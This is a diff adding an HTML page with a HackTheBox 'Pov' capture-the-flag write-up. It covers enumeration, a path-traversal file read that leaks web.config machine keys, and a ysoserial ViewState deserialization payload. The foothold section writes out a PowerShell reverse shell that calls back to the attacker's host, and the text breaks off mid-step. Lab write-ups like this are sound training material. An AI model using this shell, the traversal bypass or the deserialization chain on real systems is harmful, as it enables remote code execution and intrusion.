@@ -1,0 +1,1031 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+  <head>
+  <link href="http://gmpg.org/xfn/11" rel="profile">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+  <!-- Enable responsiveness on mobile devices-->
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+
+  <title>
+    
+      HackTheBox: Pov &middot; tralsesec
+    
+  </title>
+
+  <!-- CSS -->
+  <!--<link rel="stylesheet" href="public/css/poole.css">-->
+  <!--<link rel="stylesheet" href="public/css/blackdoc.css">-->
+  <link rel="stylesheet" href="/public/css/syntax.css">
+  <link rel="stylesheet" href="/public/css/modern.css">
+  <!--<link rel="stylesheet" href="public/css/operator.css">-->
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=PT+Sans:400,400italic,700|Abril+Fatface">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=EB+Garamond">
+  <!-- Icons -->
+  <link rel="apple-touch-icon" sizes="144x144" href="/public/apple-touch-icon.png">
+  <link rel="shortcut icon" href="/public/favicon.ico">
+
+  <!-- RSS -->
+  <link rel="alternate" type="application/rss+xml" title="RSS" href="/atom.xml">
+</head>
+
+
+  <body>
+
+    <div class="sidebar">
+  <div class="container sidebar-sticky" style="display: flex; flex-direction: column; height: 100%;">
+    
+    <div class="sidebar-about">
+      <h1>
+        <a href="/">
+          tralsesec
+        </a>
+      </h1>
+      <p class="lead">Offensive Security Researcher · Malware Developer & Analyst · Exploit Developer · CTF Player</p>
+    </div>
+
+    <nav class="sidebar-nav">
+      <a class="sidebar-nav-item" href="/">Home</a>
+      <a class="sidebar-nav-item" href="/about">About</a>
+      <a class="sidebar-nav-item" href="/projects">Projects</a>
+      <a class="sidebar-nav-item" href="/anatomy-of-a-bug">Anatomy of a Bug</a>
+      <a class="sidebar-nav-item active" href="/ctfs">Capture the Flags</a>
+
+      <hr style="border: 0; border-top: 1px solid var(--border); margin: 1.5rem 0;">
+
+      <a class="sidebar-nav-item" href="https://x.com/tralsesec" target="_blank" rel="noopener noreferrer">
+        <svg style="width:16px; height:16px; margin-right:8px; vertical-align:middle; fill:currentColor;" viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
+        X
+      </a>
+
+      <a class="sidebar-nav-item" href="https://github.com/tralsesec" target="_blank" rel="noopener noreferrer">
+        <svg style="width:16px; height:16px; margin-right:8px; vertical-align:middle; fill:currentColor;" viewBox="0 0 16 16"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"/></svg>
+        GitHub
+      </a>
+
+      <a class="sidebar-nav-item" href="https://app.hackthebox.com/public/users/475600" target="_blank" rel="noopener noreferrer">
+        <svg style="width:16px; height:16px; margin-right:8px; vertical-align:middle; fill:currentColor;" viewBox="0 0 24 24"><path d="M11.99 0l-10.4 6.02v12.01l10.4 6.02 10.4-6.02V6.02L11.99 0zM3.46 17.2V6.9l8.53-4.93 8.53 4.93v10.3l-8.53 4.93-8.53-4.93z"/><path d="M11.99 3.5L4.8 7.66v8.32l7.19 4.16 7.19-4.16V7.66L11.99 3.5zm5.72 11.53l-5.72 3.31-5.72-3.31V8.47l5.72-3.31 5.72 3.31v6.56z"/></svg>
+        HackTheBox
+      </a>
+
+    </nav>
+
+    <p style="margin-top: auto; padding-top: 2rem; margin-bottom: 0; font-size: 0.9rem;">
+      &copy; 2026. All rights reserved.
+    </p>
+  </div>
+</div>
+
+
+    <div class="content container">
+      <div class="post">
+  <h1 class="post-title" style="line-height: 1.3; padding-bottom: 1.3rem;">HackTheBox: Pov</h1>
+
+  <div class="post-meta" style="font-family: var(--font-mono); font-size: 0.75em; margin-bottom: 2rem;">
+    
+      <div style="display: flex; flex-wrap: wrap; gap: 10px; align-items: center;">
+        
+          <span style="background: rgba(159, 239, 0, 0.05); border: 1px solid rgba(159, 239, 0, 0.2); padding: 2px 8px; border-radius: 2px; color: var(--accent);">
+            #WINDOWS
+          </span>
+        
+          <span style="background: rgba(159, 239, 0, 0.05); border: 1px solid rgba(159, 239, 0, 0.2); padding: 2px 8px; border-radius: 2px; color: var(--accent);">
+            #.NET
+          </span>
+        
+          <span style="background: rgba(159, 239, 0, 0.05); border: 1px solid rgba(159, 239, 0, 0.2); padding: 2px 8px; border-radius: 2px; color: var(--accent);">
+            #ASPX
+          </span>
+        
+          <span style="background: rgba(159, 239, 0, 0.05); border: 1px solid rgba(159, 239, 0, 0.2); padding: 2px 8px; border-radius: 2px; color: var(--accent);">
+            #YSOSERIAL
+          </span>
+        
+          <span style="background: rgba(159, 239, 0, 0.05); border: 1px solid rgba(159, 239, 0, 0.2); padding: 2px 8px; border-radius: 2px; color: var(--accent);">
+            #LOCAL-FILE-READ
+          </span>
+        
+          <span style="background: rgba(159, 239, 0, 0.05); border: 1px solid rgba(159, 239, 0, 0.2); padding: 2px 8px; border-radius: 2px; color: var(--accent);">
+            #DESERIALIZATION
+          </span>
+        
+          <span style="background: rgba(159, 239, 0, 0.05); border: 1px solid rgba(159, 239, 0, 0.2); padding: 2px 8px; border-radius: 2px; color: var(--accent);">
+            #RCE
+          </span>
+        
+          <span style="background: rgba(159, 239, 0, 0.05); border: 1px solid rgba(159, 239, 0, 0.2); padding: 2px 8px; border-radius: 2px; color: var(--accent);">
+            #CREDENTIAL-DECRYPTION
+          </span>
+        
+          <span style="background: rgba(159, 239, 0, 0.05); border: 1px solid rgba(159, 239, 0, 0.2); padding: 2px 8px; border-radius: 2px; color: var(--accent);">
+            #SEDEBUGPRIVILEGE
+          </span>
+        
+          <span style="background: rgba(159, 239, 0, 0.05); border: 1px solid rgba(159, 239, 0, 0.2); padding: 2px 8px; border-radius: 2px; color: var(--accent);">
+            #IMPERSONATION
+          </span>
+        
+        <span class="post-date" style="color: var(--fg-dim);">// 2026-05-12</span>
+      </div>
+    
+  </div>
+
+  
+     <div class="intel-frame" style="padding: 5px; background: #000; transition: transform 0.2s ease;">
+      <a href="/assets/img/ctf/pov.png" target="_blank" style="border: none; display: block;">
+        <img src="/assets/img/ctf/pov.png" style="width: 30%; border-color: #000; display: block; cursor: zoom-in; margin-left: auto; margin-right: auto;">
+      </a>
+    </div>   
+  
+
+  <br><br>
+
+  <h1 id="-pov">🎯 Pov</h1>
+
+<table>
+  <tbody>
+    <tr>
+      <td><strong>OS:</strong> Windows</td>
+      <td><strong>Difficulty:</strong> Medium</td>
+      <td><strong>IP:</strong> <code class="language-plaintext highlighter-rouge">10.129.44.96</code></td>
+    </tr>
+  </tbody>
+</table>
+
+<p><img src="/assets/img/ctf/data/pov-htb.png" alt="pov.htb" /></p>
+
+<hr />
+
+<h2 id="️-tldr--attack-chain">⛓️ TL;DR / Attack Chain</h2>
+<ol>
+  <li><strong>Foothold:</strong> Exploited a <code class="language-plaintext highlighter-rouge">Local File Read</code> (LFR) vulnerability in the CV download functionality to leak the <code class="language-plaintext highlighter-rouge">web.config</code> file. Leveraged the exposed <code class="language-plaintext highlighter-rouge">validationKey</code> and <code class="language-plaintext highlighter-rouge">decryptionKey</code> to craft a malicious .NET ViewState Deserialization payload using <code class="language-plaintext highlighter-rouge">ysoserial.exe</code>, resulting in RCE as <code class="language-plaintext highlighter-rouge">pov\sfitz</code>.</li>
+  <li><strong>Lateral Movement:</strong> Located a PowerShell credential file (<code class="language-plaintext highlighter-rouge">connection.xml</code>) in the user’s Documents. Decrypted the stored credentials to gain access to the alaading account.</li>
+  <li><strong>Privilege Escalation:</strong> Identified <code class="language-plaintext highlighter-rouge">SeDebugPrivilege</code> on the <code class="language-plaintext highlighter-rouge">pov\alaading</code> account. Bypassed UAC by pivoting through WinRM (via SOCKS) to obtain a <code class="language-plaintext highlighter-rouge">High Integrity</code> shell. Leveraged the debug privilege to perform Parent PID Spoofing against <code class="language-plaintext highlighter-rouge">winlogon.exe</code>, escalating to <code class="language-plaintext highlighter-rouge">NT AUTHORITY\SYSTEM</code>.</li>
+</ol>
+
+<hr />
+
+<h2 id="-loot--creds">🔑 Loot &amp; Creds</h2>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">User</th>
+      <th style="text-align: left">Credential</th>
+      <th style="text-align: left">Where / How</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">alaading</code></td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">f8gQ8fynP44ek1m3</code></td>
+      <td style="text-align: left">Encrypted in <code class="language-plaintext highlighter-rouge">C:\Users\sfitz\Documents\connection.xml</code></td>
+    </tr>
+  </tbody>
+</table>
+
+<hr />
+
+<h2 id="-0-setup--global-variables">🔧 0. Setup &amp; Global Variables</h2>
+<p><em>Run this in your terminal once so you can copy-paste the rest of the commands blindly.</em></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ IP</span><span class="o">=</span><span class="s2">"10.129.44.96"</span> <span class="p">;</span> <span class="nv">DOMAIN</span><span class="o">=</span><span class="s2">"pov.htb"</span> <span class="o">&amp;&amp;</span> <span class="se">\</span>
+  <span class="nb">echo</span> <span class="s2">"</span><span class="nv">$IP</span><span class="s2"> </span><span class="nv">$DOMAIN</span><span class="s2">"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="-1-enumeration">🔍 1. Enumeration</h2>
+
+<h3 id="nmap">Nmap</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">mkdir</span> <span class="nt">-p</span> nmap <span class="o">&amp;&amp;</span> nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p-</span> <span class="nv">$IP</span> <span class="nt">-oA</span> ./nmap/nmap
+Starting Nmap 7.99 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2026-05-12 17:35 +0200
+Nmap scan report <span class="k">for </span>pov.htb <span class="o">(</span>10.129.44.96<span class="o">)</span>
+Host is up <span class="o">(</span>0.026s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 65534 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Microsoft IIS httpd 10.0
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-title: pov.htb
+|_http-server-header: Microsoft-IIS/10.0
+Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>116.44 seconds
+</code></pre></div></div>
+
+<h3 id="http80">HTTP/80</h3>
+
+<p><code class="language-plaintext highlighter-rouge">http://pov.htb/</code>
+<img src="/assets/img/ctf/data/pov-1.png" alt="pov-1.htb" /></p>
+
+<p><code class="language-plaintext highlighter-rouge">http://dev.pov.htb/</code>
+<img src="/assets/img/ctf/data/pov-2.png" alt="pov-2.htb" /></p>
+
+<p>Hovering over the link it guides to <code class="language-plaintext highlighter-rouge">http://dev.pov.htb:8080/</code>
+<img src="/assets/img/ctf/data/pov-3.png" alt="pov-3.htb" /></p>
+
+<p>But it doesn’t load. Strange. Probably a local port that we have to look at later.</p>
+
+<p>Directory fuzzing:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">mkdir</span> <span class="nt">-p</span> ffuf <span class="o">&amp;&amp;</span> ffuf <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">-u</span> http://dev.<span class="nv">$DOMAIN</span>/FUZZ <span class="nt">-fc</span> 302 | <span class="nb">tee</span> ./ffuf/dir.scan
+
+        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://dev.pov.htb/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response status: 302
+________________________________________________
+
+:: Progress: [220560/220560] :: Job [1/1] :: 1515 req/sec :: Duration: [0:02:45] :: Errors: 0 ::
+</span></code></pre></div></div>
+
+<p>vhosts fuzzing:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">mkdir</span> <span class="nt">-p</span> ffuf <span class="o">&amp;&amp;</span> ffuf <span class="nt">-w</span> /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt <span class="nt">-u</span> http://<span class="nv">$DOMAIN</span>/ <span class="nt">-H</span> <span class="s2">"Host: FUZZ.</span><span class="nv">$DOMAIN</span><span class="s2">"</span> <span class="nt">-fs</span> 12330 | <span class="nb">tee</span> ./ffuf/vhosts.scan
+
+        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://pov.htb/
+ :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
+ :: Header           : Host: FUZZ.pov.htb
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response size: 12330
+________________________________________________
+
+dev                     [Status: 302, Size: 152, Words: 9, Lines: 2, Duration: 31ms]
+:: Progress: [114442/114442] :: Job [1/1] :: 769 req/sec :: Duration: [0:01:22] :: Errors: 0 ::
+</span></code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">http://dev.pov.htb/portfolio/contact.aspx</code>
+<img src="/assets/img/ctf/data/pov-4.png" alt="pov-4.htb" /></p>
+
+<p><code class="language-plaintext highlighter-rouge">Available 24/7</code> might be a nudge for XSS / SSTI (ASPX) Injection.</p>
+
+<p>I noticed that providing XSS/HTML Injection payloads does nothing and it redirects me back to <code class="language-plaintext highlighter-rouge">default.aspx</code>. But providing .NET payloads (like <code class="language-plaintext highlighter-rouge">&lt;% ... %&gt;</code> or <code class="language-plaintext highlighter-rouge">@{ ... }</code>) doesn’t redirect me back to <code class="language-plaintext highlighter-rouge">default.aspx</code> but to <code class="language-plaintext highlighter-rouge">contact.aspx</code> (stays on the same site).</p>
+
+<p>Anyways, I see a CV we can download on <code class="language-plaintext highlighter-rouge">default.aspx</code>:
+<img src="/assets/img/ctf/data/pov-5.png" alt="pov-5.htb" /></p>
+
+<p><img src="/assets/img/ctf/data/pov-6.png" alt="pov-6.htb" />
+<em>MySQL is not a language btw</em></p>
+
+<p>Let’s see how good his knowledge of C# is ^^.</p>
+
+<p>Wondering about how exactly the download button works, I found this:</p>
+
+<p><img src="/assets/img/ctf/data/pov-7.png" alt="pov-7.htb" /></p>
+
+<p>So it literally just tells it the filename as a value and then executes the <code class="language-plaintext highlighter-rouge">__doPostBack</code> function which sends the <code class="language-plaintext highlighter-rouge">download</code> and <code class="language-plaintext highlighter-rouge">cv.pdf</code> value to the backend to perform the next action. The backend is stateless, that’s the reason why you find these variables in the POST request:
+<img src="/assets/img/ctf/data/pov-8.png" alt="pov-8.htb" /></p>
+
+<p>That CV-downloading buttom push is equivilant to the following javascript code (in console):</p>
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">file</span><span class="dl">'</span><span class="p">).</span><span class="nx">value</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">cv.pdf</span><span class="dl">'</span><span class="p">;</span>
+<span class="nf">__doPostBack</span><span class="p">(</span><span class="dl">'</span><span class="s1">download</span><span class="dl">'</span><span class="p">,</span> <span class="dl">''</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>I suspect that it’s internally just doing <code class="language-plaintext highlighter-rouge">Download(path="./" + file_name)</code> so maybe we can download code:</p>
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">file</span><span class="dl">'</span><span class="p">).</span><span class="nx">value</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">default.aspx</span><span class="dl">'</span><span class="p">;</span>
+<span class="nf">__doPostBack</span><span class="p">(</span><span class="dl">'</span><span class="s1">download</span><span class="dl">'</span><span class="p">,</span> <span class="dl">''</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>Indeed! It downloaded code:</p>
+<pre><code class="language-asp">&lt;%@ Page Language="C#" AutoEventWireup="true" CodeFile="index.aspx.cs" Inherits="index"%&gt;
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang="en"&gt;
+&lt;head&gt;
+
+&lt;SNIP&gt;
+</code></pre>
+
+<p>Here we go! Let’s download important files and maybe we’ll find some credentials or other vulnerabilities!</p>
+
+<p>Indeed, exactly as suspected (<code class="language-plaintext highlighter-rouge">index.aspx.cs</code>):</p>
+<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">using</span> <span class="nn">System</span><span class="p">;</span>
+<span class="k">using</span> <span class="nn">System.Collections.Generic</span><span class="p">;</span>
+<span class="k">using</span> <span class="nn">System.Web</span><span class="p">;</span>
+<span class="k">using</span> <span class="nn">System.Web.UI</span><span class="p">;</span>
+<span class="k">using</span> <span class="nn">System.Web.UI.WebControls</span><span class="p">;</span>
+<span class="k">using</span> <span class="nn">System.Text.RegularExpressions</span><span class="p">;</span>
+<span class="k">using</span> <span class="nn">System.Text</span><span class="p">;</span>
+<span class="k">using</span> <span class="nn">System.IO</span><span class="p">;</span>
+<span class="k">using</span> <span class="nn">System.Net</span><span class="p">;</span>
+
+<span class="k">public</span> <span class="k">partial</span> <span class="k">class</span> <span class="nc">index</span> <span class="p">:</span> <span class="n">System</span><span class="p">.</span><span class="n">Web</span><span class="p">.</span><span class="n">UI</span><span class="p">.</span><span class="n">Page</span> <span class="p">{</span>
+    <span class="k">protected</span> <span class="k">void</span> <span class="nf">Page_Load</span><span class="p">(</span><span class="kt">object</span> <span class="n">sender</span><span class="p">,</span> <span class="n">EventArgs</span> <span class="n">e</span><span class="p">)</span> <span class="p">{</span>
+
+    <span class="p">}</span>
+
+    <span class="k">protected</span> <span class="k">void</span> <span class="nf">Download</span><span class="p">(</span><span class="kt">object</span> <span class="n">sender</span><span class="p">,</span> <span class="n">EventArgs</span> <span class="n">e</span><span class="p">)</span> <span class="p">{</span>
+
+        <span class="kt">var</span> <span class="n">filePath</span> <span class="p">=</span> <span class="n">file</span><span class="p">.</span><span class="n">Value</span><span class="p">;</span>
+        <span class="n">filePath</span> <span class="p">=</span> <span class="n">Regex</span><span class="p">.</span><span class="nf">Replace</span><span class="p">(</span><span class="n">filePath</span><span class="p">,</span> <span class="s">"../"</span><span class="p">,</span> <span class="s">""</span><span class="p">);</span>
+        <span class="n">Response</span><span class="p">.</span><span class="n">ContentType</span> <span class="p">=</span> <span class="s">"application/octet-stream"</span><span class="p">;</span>
+        <span class="n">Response</span><span class="p">.</span><span class="nf">AppendHeader</span><span class="p">(</span><span class="s">"Content-Disposition"</span><span class="p">,</span><span class="s">"attachment; filename="</span> <span class="p">+</span> <span class="n">filePath</span><span class="p">);</span>
+        <span class="n">Response</span><span class="p">.</span><span class="nf">TransmitFile</span><span class="p">(</span><span class="n">filePath</span><span class="p">);</span>
+        <span class="n">Response</span><span class="p">.</span><span class="nf">End</span><span class="p">();</span>
+
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">Regex.Replace(filePath, "../", "");</code> is very easy to bypass to grab files we shouldn’t be able to read.</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">file</span><span class="dl">'</span><span class="p">).</span><span class="nx">value</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">C:</span><span class="se">\\</span><span class="s1">Windows</span><span class="se">\\</span><span class="s1">System32</span><span class="se">\\</span><span class="s1">drivers</span><span class="se">\\</span><span class="s1">etc</span><span class="se">\\</span><span class="s1">hosts</span><span class="dl">'</span><span class="p">;</span> <span class="nf">__doPostBack</span><span class="p">(</span><span class="dl">'</span><span class="s1">download</span><span class="dl">'</span><span class="p">,</span> <span class="dl">''</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>gives us:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Copyright (c) 1993-2009 Microsoft Corp.
+#
+# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
+#
+# This file contains the mappings of IP addresses to host names. Each
+# entry should be kept on an individual line. The IP address should
+# be placed in the first column followed by the corresponding host name.
+# The IP address and the host name should be separated by at least one
+# space.
+#
+# Additionally, comments (such as these) may be inserted on individual
+# lines or following the machine name denoted by a '#' symbol.
+#
+# For example:
+#
+#      102.54.94.97     rhino.acme.com          # source server
+#       38.25.63.10     x.acme.com              # x client host
+
+# localhost name resolution is handled within DNS itself.
+#	127.0.0.1       localhost
+#	::1             localhost
+127.0.0.1   pov.htb dev.pov.htb
+</code></pre></div></div>
+
+<p>too easy!</p>
+
+<p><code class="language-plaintext highlighter-rouge">contact.aspx.cs</code>:</p>
+<div class="language-c# highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">using</span> <span class="nn">System</span><span class="p">;</span>
+<span class="k">using</span> <span class="nn">System.Collections.Generic</span><span class="p">;</span>
+<span class="k">using</span> <span class="nn">System.Web</span><span class="p">;</span>
+<span class="k">using</span> <span class="nn">System.Web.UI</span><span class="p">;</span>
+<span class="k">using</span> <span class="nn">System.Web.UI.WebControls</span><span class="p">;</span>
+<span class="k">using</span> <span class="nn">System.Text.RegularExpressions</span><span class="p">;</span>
+<span class="k">using</span> <span class="nn">System.Text</span><span class="p">;</span>
+<span class="k">using</span> <span class="nn">System.IO</span><span class="p">;</span>
+
+<span class="k">public</span> <span class="k">partial</span> <span class="k">class</span> <span class="nc">contact</span> <span class="p">:</span> <span class="n">System</span><span class="p">.</span><span class="n">Web</span><span class="p">.</span><span class="n">UI</span><span class="p">.</span><span class="n">Page</span> <span class="p">{</span>
+    <span class="k">protected</span> <span class="k">void</span> <span class="nf">Page_Load</span><span class="p">(</span><span class="kt">object</span> <span class="n">sender</span><span class="p">,</span> <span class="n">EventArgs</span> <span class="n">e</span><span class="p">)</span> <span class="p">{</span>
+
+    <span class="p">}</span>
+    <span class="k">protected</span> <span class="k">void</span> <span class="nf">Submit</span><span class="p">(</span><span class="kt">object</span> <span class="n">sender</span><span class="p">,</span> <span class="n">EventArgs</span> <span class="n">e</span><span class="p">)</span> <span class="p">{</span>
+
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Just an empty file. A 🐇 🕳️.</p>
+
+<p>As the server has only one port open (80), it’s quite obvious that we have to find our way through the web part. We have to find RCE somewhere. For that, it would be very beneficial if we could locate all <code class="language-plaintext highlighter-rouge">.cs</code> files and check them out.</p>
+
+<p><code class="language-plaintext highlighter-rouge">..\\web.config</code>:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;configuration&gt;
+  &lt;system.web&gt;
+    &lt;customErrors mode="On" defaultRedirect="default.aspx" /&gt;
+    &lt;httpRuntime targetFramework="4.5" /&gt;
+    &lt;machineKey decryption="AES" decryptionKey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" validation="SHA1" validationKey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" /&gt;
+  &lt;/system.web&gt;
+    &lt;system.webServer&gt;
+        &lt;httpErrors&gt;
+            &lt;remove statusCode="403" subStatusCode="-1" /&gt;
+            &lt;error statusCode="403" prefixLanguageFilePath="" path="http://dev.pov.htb:8080/portfolio" responseMode="Redirect" /&gt;
+        &lt;/httpErrors&gt;
+        &lt;httpRedirect enabled="true" destination="http://dev.pov.htb/portfolio" exactDestination="false" childOnly="true" /&gt;
+    &lt;/system.webServer&gt;
+&lt;/configuration&gt;
+</code></pre></div></div>
+
+<p>Jackpot! As we have the <code class="language-plaintext highlighter-rouge">decryptionKey</code> and the <code class="language-plaintext highlighter-rouge">validationKey</code> now, we can encrypt our own malicious <code class="language-plaintext highlighter-rouge">VIEWSTATES</code> and cause RCE!</p>
+
+<hr />
+
+<h2 id="-2-initial-foothold">🚪 2. Initial Foothold</h2>
+
+<p>Start a netcat listener:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-lnvp</span> 1337
+listening on <span class="o">[</span>any] 1337 ...
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'$client = New-Object System.Net.Sockets.TCPClient("&lt;YOUR IP&gt;",1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2&gt;&amp;1" | Out-String ); $sendback2 = $sendback + "PS " + (pwd).Path + "&gt; ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'</span> | iconv <span class="nt">--to-code</span><span class="o">=</span>UTF-16LE | <span class="nb">base64</span> <span class="nt">-w</span> 0
+
+JABjAGwAaQBlAG4AdAAgAD0AIABOAGUA&lt;SNIP&gt;
+
+<span class="nv">$ </span>wine ysoserial.exe <span class="nt">-p</span> ViewState <span class="nt">-g</span> TextFormattingRunProperties <span class="nt">-c</span> <span class="s2">"powershell.exe -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUA&lt;SNIP&gt;"</span> <span class="nt">--path</span><span class="o">=</span><span class="s2">"/portfolio"</span> <span class="nt">--apppath</span><span class="o">=</span><span class="s2">"/"</span> <span class="nt">--validationalg</span><span class="o">=</span><span class="s2">"SHA1"</span> <span class="nt">--validationkey</span><span class="o">=</span>5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468 <span class="nt">--decryptionalg</span><span class="o">=</span><span class="s2">"AES"</span> <span class="nt">--decryptionkey</span><span class="o">=</span>74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43
+
+&lt;SNIP&gt;
+
+%2Fio5gCRmlaF%2FGvkZb&lt;SNIP&gt;
+
+&lt;SNIP&gt;
+
+<span class="nv">$ VIEWSTATE</span><span class="o">=</span><span class="s2">"%2Fio5gCRmlaF%2FGvkZb&lt;SNIP&gt;"</span>
+
+<span class="nv">$ </span>curl <span class="nt">-X</span> POST http://dev.pov.htb/portfolio/     <span class="nt">-d</span> <span class="s2">"__EVENTTARGET=download"</span>     <span class="nt">-d</span> <span class="s2">"__VIEWSTATE=</span><span class="nv">$VIEWSTATE</span><span class="s2">"</span>     <span class="nt">-d</span> <span class="s2">"__VIEWSTATEGENERATOR=8E0F0FA3"</span>     <span class="nt">-d</span> <span class="s2">"file=cv.pdf"</span>
+&lt;html&gt;&lt;<span class="nb">head</span><span class="o">&gt;</span>&lt;title&gt;Object moved&lt;/title&gt;&lt;/head&gt;&lt;body&gt;
